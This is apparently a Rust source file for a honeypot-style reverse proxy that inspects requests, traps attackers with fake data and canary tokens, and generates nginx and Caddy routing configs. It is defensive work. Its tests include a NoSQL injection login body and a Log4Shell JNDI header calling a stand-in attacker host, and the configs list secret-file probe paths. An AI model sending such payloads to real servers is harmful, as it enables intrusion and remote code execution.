pub mod waf;

use axum::body::Body as AxumBody;
use axum::response::Response as AxumResponse;
use axum::Router;
use evilpot::{
    extract_client_ip, AttackCategory, AttackSignal, EvilpotBody, EvilpotEngine,
};
use http::{header, HeaderMap, HeaderName, HeaderValue, Request, Response, StatusCode, Uri};
use http_body_util::{BodyExt, Limited};
use hyper_util::client::legacy::connect::HttpConnector;
use hyper_util::client::legacy::Client;
use hyper_util::rt::TokioExecutor;
use std::net::SocketAddr;
use std::sync::Arc;
use tokio::net::TcpListener;
use tracing::{info, warn};

pub use waf::{
    inspect_request_body, inspect_request_head, is_path_exempt, should_inspect_body,
    ForefrontConfig, ForefrontHttpConfig, ForefrontMode, ForefrontSigilConfig, SinkFallbackTrap,
};

#[derive(Clone)]
struct ForefrontState {
    engine: Arc<EvilpotEngine>,
    http_cfg: ForefrontHttpConfig,
    sigil_cfg: ForefrontSigilConfig,
    client: Client<HttpConnector, AxumBody>,
}

fn to_axum_response(resp: Response<EvilpotBody>) -> AxumResponse {
    resp.map(AxumBody::new)
}

fn verify_ingress_header(headers: &HeaderMap, spec: &str) -> bool {
    let Some((name, expected_val)) = spec.split_once(':') else {
        return headers.contains_key(spec.trim());
    };
    headers
        .get(name.trim())
        .and_then(|v| v.to_str().ok())
        .map(|v| v.trim() == expected_val.trim())
        .unwrap_or(false)
}

/// Build the `evilpot-forefront` Axum `Router` combining `sigil-filter` WAF inspection,
/// canary token verification, `evilpot` deception traps, and reverse proxying.
pub fn build_forefront_router(
    engine: Arc<EvilpotEngine>,
    http_cfg: ForefrontHttpConfig,
    sigil_cfg: ForefrontSigilConfig,
) -> Router {
    let client: Client<HttpConnector, AxumBody> =
        Client::builder(TokioExecutor::new()).build_http();
    let state = Arc::new(ForefrontState {
        engine,
        http_cfg,
        sigil_cfg,
        client,
    });

    Router::new().fallback(move |req: Request<AxumBody>| {
        let st = state.clone();
        async move { handle_forefront_request(st, req).await }
    })
}

async fn handle_forefront_request(
    state: Arc<ForefrontState>,
    req: Request<AxumBody>,
) -> AxumResponse {
    let method_str = req.method().as_str().to_string();
    let path = req.uri().path().to_string();
    let query = req.uri().query().map(str::to_string);

    // 1. Secret Admin Panel (`/status`, `/sessions`, `/rotate`)
    if let Some(admin_resp) =
        state
            .engine
            .handle_admin_request(&method_str, &path, req.headers())
    {
        return to_axum_response(admin_resp);
    }

    // 2. In BehindProxySink mode, verify optional ingress header so direct probes bypassing WAF get 404
    if state.http_cfg.mode == ForefrontMode::BehindProxySink {
        if let Some(ref req_hdr) = state.http_cfg.required_ingress_header {
            if !verify_ingress_header(req.headers(), req_hdr) {
                return Response::builder()
                    .status(StatusCode::NOT_FOUND)
                    .body(AxumBody::from("Not Found"))
                    .unwrap();
            }
        }
    }

    let client_ip = extract_client_ip(&req, state.http_cfg.real_ip_header.as_deref());

    // 3. Always check if the client is replaying an implanted canary credential / token / vault path!
    if let Some(canary_outcome) = state
        .engine
        .handle_canary_if_present(
            client_ip,
            &method_str,
            &path,
            query.as_deref(),
            req.headers(),
        )
        .await
    {
        return to_axum_response(canary_outcome.response);
    }

    // 4. Inspect request head (URI path, query string, headers) with `sigil-filter` + decoy routes
    if let Some(signal) = inspect_request_head(
        &state.http_cfg,
        &state.sigil_cfg,
        &method_str,
        &path,
        query.as_deref(),
        req.headers(),
    ) {
        let outcome = state
            .engine
            .handle_attack(
                client_ip,
                &method_str,
                &path,
                query.as_deref(),
                req.headers(),
                signal,
            )
            .await;
        return to_axum_response(outcome.response);
    }

    // 5. Inspect request body (`POST`/`PUT`/`PATCH` text/JSON/form/XML) with `sigil-filter` if enabled
    let mut req = req;
    if !is_path_exempt(&path, &state.sigil_cfg.exempt_paths) {
        if let Some(limit) =
            should_inspect_body(&state.sigil_cfg, req.method(), req.headers())
        {
            let ct = req
                .headers()
                .get(header::CONTENT_TYPE)
                .and_then(|v| v.to_str().ok())
                .map(str::to_string);
            let (parts, body) = req.into_parts();
            if let Ok(collected) = Limited::new(body, limit).collect().await {
                let bytes = collected.to_bytes();
                if let Some(signal) =
                    inspect_request_body(&state.sigil_cfg, ct.as_deref(), &bytes)
                {
                    let outcome = state
                        .engine
                        .handle_attack(
                            client_ip,
                            &method_str,
                            &path,
                            query.as_deref(),
                            &parts.headers,
                            signal,
                        )
                        .await;
                    return to_axum_response(outcome.response);
                }
                req = Request::from_parts(parts, AxumBody::from(bytes));
            } else {
                // Body exceeded `max_body_bytes`; divert or reject
                return Response::builder()
                    .status(StatusCode::PAYLOAD_TOO_LARGE)
                    .body(AxumBody::from("Payload Too Large"))
                    .unwrap();
            }
        }
    }

    // 6. In `BehindProxySink` mode, 100% of diverted requests are trapped using `sink_fallback_trap`
    if state.http_cfg.mode == ForefrontMode::BehindProxySink {
        let fallback_trap = state
            .http_cfg
            .sink_fallback_trap
            .to_trap_verdict(&method_str);
        let signal = AttackSignal::new(AttackCategory::GenericSuspicious, "sink_fallback", 0.80)
            .with_explicit_trap(fallback_trap);
        let outcome = state
            .engine
            .handle_attack(
                client_ip,
                &method_str,
                &path,
                query.as_deref(),
                req.headers(),
                signal,
            )
            .await;
        return to_axum_response(outcome.response);
    }

    // 7. Benign request: in `FrontlineProxy` mode, forward to real `upstream_http_url`
    if state.http_cfg.mode == ForefrontMode::FrontlineProxy {
        if let Some(ref upstream_url) = state.http_cfg.upstream_http_url {
            return proxy_to_upstream(
                state.client.clone(),
                upstream_url.clone(),
                req,
                client_ip,
            )
            .await;
        }
    }

    // 8. `Standalone` mode (or `FrontlineProxy` without upstream configured): minimal gateway banner on `/`, 404 elsewhere
    if path == "/" {
        Response::builder()
            .status(StatusCode::OK)
            .header(header::CONTENT_TYPE, "text/plain; charset=utf-8")
            .body(AxumBody::from(
                "Welcome to Internal Service Gateway. All endpoints require authentication.\n",
            ))
            .unwrap()
    } else {
        Response::builder()
            .status(StatusCode::NOT_FOUND)
            .header(header::CONTENT_TYPE, "text/plain; charset=utf-8")
            .body(AxumBody::from("Not Found"))
            .unwrap()
    }
}

async fn proxy_to_upstream(
    client: Client<HttpConnector, AxumBody>,
    upstream_base_url: String,
    req: Request<AxumBody>,
    client_ip: std::net::IpAddr,
) -> AxumResponse {
    let path_and_query = req
        .uri()
        .path_and_query()
        .map(|pq| pq.as_str())
        .unwrap_or("/");
    let target_uri_str = format!(
        "{}{}",
        upstream_base_url.trim_end_matches('/'),
        path_and_query
    );
    let Ok(target_uri) = target_uri_str.parse::<Uri>() else {
        return Response::builder()
            .status(StatusCode::BAD_GATEWAY)
            .body(AxumBody::from("Invalid upstream URI"))
            .unwrap();
    };

    let (mut parts, body) = req.into_parts();
    parts.uri = target_uri.clone();
    parts.headers.remove(header::HOST);
    parts.headers.remove(header::CONNECTION);
    if let Some(authority) = target_uri.authority() {
        if let Ok(val) = HeaderValue::from_str(authority.as_str()) {
            parts.headers.insert(header::HOST, val);
        }
    }
    if let Ok(ip_val) = HeaderValue::from_str(&client_ip.to_string()) {
        parts
            .headers
            .insert(HeaderName::from_static("x-forwarded-for"), ip_val);
    }

    let outbound_req = Request::from_parts(parts, body);
    match client.request(outbound_req).await {
        Ok(upstream_resp) => {
            let (resp_parts, resp_body) = upstream_resp.into_parts();
            let collected = resp_body
                .collect()
                .await
                .map(|c| c.to_bytes())
                .unwrap_or_default();
            Response::from_parts(resp_parts, AxumBody::from(collected))
        }
        Err(err) => {
            warn!(error = %err, %upstream_base_url, "evilpot-forefront reverse proxy upstream error");
            Response::builder()
                .status(StatusCode::BAD_GATEWAY)
                .body(AxumBody::from("Bad Gateway"))
                .unwrap()
        }
    }
}

pub async fn run_forefront_server(cfg: ForefrontConfig) -> std::io::Result<()> {
    let engine = EvilpotEngine::new(cfg.evilpot.clone());
    let _rotator = engine.spawn_rotation_task();

    let bind_addr = cfg.http.bind_addr;
    let mode = cfg.http.mode;
    let listener = TcpListener::bind(bind_addr).await?;
    if engine.config().admin.enabled {
        info!(
            %bind_addr,
            ?mode,
            upstream = ?cfg.http.upstream_http_url,
            status_url = %format!("http://{}{}/status", bind_addr, engine.admin_path_prefix()),
            sessions_url = %format!("http://{}{}/sessions", bind_addr, engine.admin_path_prefix()),
            rotate_url = %format!("http://{}{}/rotate", bind_addr, engine.admin_path_prefix()),
            "evilpot-forefront reverse proxy & deception engine listening"
        );
    } else {
        info!(%bind_addr, ?mode, "evilpot-forefront listening (admin panel disabled)");
    }

    let app = build_forefront_router(engine, cfg.http, cfg.sigil);
    axum::serve(
        listener,
        app.into_make_service_with_connect_info::<SocketAddr>(),
    )
    .await
}

pub fn generate_nginx_sink_config(forefront_addr: &str, real_upstream: &str) -> String {
    format!(
        r#"# ============================================================================
# evilpot-forefront Behind-Proxy Sink Integration for Nginx
# ============================================================================
# Run evilpot-forefront with:
#   evilpot-forefront --mode behind-proxy-sink --bind {forefront_addr}
#
# And set in config.toml:
#   [http]
#   mode = "behind_proxy_sink"
#   real_ip_header = "x-real-ip"
#   required_ingress_header = "X-Evilpot-Sink: replace_with_shared_secret"
#   sink_fallback_trap = "api_debug"

upstream real_app {{
    server {real_upstream};
}}

upstream evilpot_honeypot_sink {{
    server {forefront_addr};
    keepalive 32;
}}

server {{
    listen 80;
    server_name example.com;

    location ~* ^/(wp-login\.php|wp-admin|wp-json|xmlrpc\.php|wp-config|wp-content/debug\.log|\.env|\.git|actuator|phpinfo\.php|backup\.sql|heapdump) {{
        proxy_pass http://evilpot_honeypot_sink;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Evilpot-Sink "replace_with_shared_secret";
        proxy_buffering off;
    }}

    location / {{
        proxy_pass http://real_app;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }}
}}
"#
    )
}

pub fn generate_caddy_sink_config(forefront_addr: &str, real_upstream: &str) -> String {
    format!(
        r#"# ============================================================================
# evilpot-forefront Behind-Proxy Sink Integration for Caddy
# ============================================================================
example.com {{
    @attack_probes {{
        path /wp-login.php /wp-admin/* /wp-json* /xmlrpc.php /wp-config* /.env* /.git/* /actuator/* /phpinfo.php *.sql.gz /heapdump
    }}

    handle @attack_probes {{
        reverse_proxy {forefront_addr} {{
            header_up X-Real-IP {{remote_host}}
            header_up X-Evilpot-Sink "replace_with_shared_secret"
            flush_interval -1
        }}
    }}

    handle {{
        reverse_proxy {real_upstream}
    }}
}}
"#
    )
}

#[cfg(test)]
mod tests {
    use super::*;
    use axum::routing::get;
    use evilpot::ExploitVerificationStatus;
    use tower::ServiceExt;

    #[tokio::test]
    async fn test_forefront_proxy_forwards_benign_and_traps_sigil_attacks_with_verification() {
        // 1. Start a real mock upstream backend server
        let upstream_listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let upstream_addr = upstream_listener.local_addr().unwrap();
        let upstream_app = Router::new().route(
            "/api/v1/orders",
            get(|| async { "REAL_UPSTREAM_ORDERS_OK" }),
        );
        tokio::spawn(async move {
            let _ = axum::serve(upstream_listener, upstream_app).await;
        });

        // 2. Configure evilpot-forefront in FrontlineProxy mode pointing to that upstream
        let mut cfg = ForefrontConfig::default();
        cfg.http.mode = ForefrontMode::FrontlineProxy;
        cfg.http.upstream_http_url = Some(format!("http://{upstream_addr}"));
        let engine = EvilpotEngine::new(cfg.evilpot.clone());
        let app = build_forefront_router(engine.clone(), cfg.http, cfg.sigil);

        // 3. Benign business request is transparently proxied to real upstream!
        let benign_req = Request::builder()
            .uri("/api/v1/orders?page=1&limit=20")
            .header(
                "user-agent",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            )
            .body(AxumBody::empty())
            .unwrap();
        let benign_resp = app.clone().oneshot(benign_req).await.unwrap();
        assert_eq!(benign_resp.status(), StatusCode::OK);
        let benign_body = benign_resp.into_body().collect().await.unwrap().to_bytes();
        assert_eq!(benign_body.as_ref(), b"REAL_UPSTREAM_ORDERS_OK");

        // 4. Attack request (`/.env`) is caught by forefront and diverted to evilpot!
        let env_req = Request::builder()
            .uri("/.env")
            .header("x-real-ip", "198.51.100.77")
            .body(AxumBody::empty())
            .unwrap();
        let env_resp = app.clone().oneshot(env_req).await.unwrap();
        assert_eq!(env_resp.status(), StatusCode::OK);
        let env_body = env_resp.into_body().collect().await.unwrap().to_bytes();
        let env_text = std::str::from_utf8(&env_body).unwrap();
        assert!(env_text.contains("AWS_ACCESS_KEY_ID=AKIA"));

        // 5. Attacker replays the leaked `ADMIN_BYPASS_TOKEN` from `/.env` against a normal business route
        // (`/api/v1/orders`) -> forefront's canary check intercepts it and verifies 100% real exploitation!
        let persona = engine.select_persona("198.51.100.77".parse().unwrap());
        let canary_req = Request::builder()
            .uri("/api/v1/orders")
            .header("x-real-ip", "198.51.100.77")
            .header(
                "authorization",
                format!("Bearer {}", persona.canary_api_key),
            )
            .body(AxumBody::empty())
            .unwrap();
        let canary_resp = app.clone().oneshot(canary_req).await.unwrap();
        assert_eq!(canary_resp.status(), StatusCode::OK);
        let canary_body = canary_resp.into_body().collect().await.unwrap().to_bytes();
        let canary_text = std::str::from_utf8(&canary_body).unwrap();
        assert!(canary_text.contains("vault_export_unlocked"));

        let session = engine
            .session_report("198.51.100.77".parse().unwrap())
            .unwrap();
        assert_eq!(session.status, ExploitVerificationStatus::VerifiedExploit);
        assert_eq!(session.canary_triggers, 1);
    }

    #[tokio::test]
    async fn test_forefront_sigil_inspects_json_body_and_headers() {
        let cfg = ForefrontConfig::default();
        let engine = EvilpotEngine::new(cfg.evilpot.clone());
        let app = build_forefront_router(engine.clone(), cfg.http, cfg.sigil);

        // 1. NoSQL injection in POST JSON body -> caught by sigil-filter and served fake MongoDB admin dump
        let nosql_req = Request::builder()
            .method("POST")
            .uri("/api/v1/login")
            .header("x-real-ip", "203.0.113.44")
            .header("content-type", "application/json")
            .body(AxumBody::from(
                r#"{"username":{"$ne":null},"password":{"$gt":""}}"#,
            ))
            .unwrap();
        let nosql_resp = app.clone().oneshot(nosql_req).await.unwrap();
        assert_eq!(nosql_resp.status(), StatusCode::OK);
        let nosql_body = nosql_resp.into_body().collect().await.unwrap().to_bytes();
        assert!(std::str::from_utf8(&nosql_body)
            .unwrap()
            .contains("\"role\": \"superadmin\""));

        // 2. Log4Shell / JNDI in X-Api-Version header -> caught by sigil-filter and served fake JNDI stack trace
        let jndi_req = Request::builder()
            .uri("/api/v1/items")
            .header("x-real-ip", "203.0.113.45")
            .header("x-api-version", "${jndi:ldap://evil.example/Exploit}")
            .body(AxumBody::empty())
            .unwrap();
        let jndi_resp = app.clone().oneshot(jndi_req).await.unwrap();
        assert_eq!(jndi_resp.status(), StatusCode::INTERNAL_SERVER_ERROR);
        let jndi_body = jndi_resp.into_body().collect().await.unwrap().to_bytes();
        assert!(std::str::from_utf8(&jndi_body)
            .unwrap()
            .contains("JndiLookup"));
    }
}
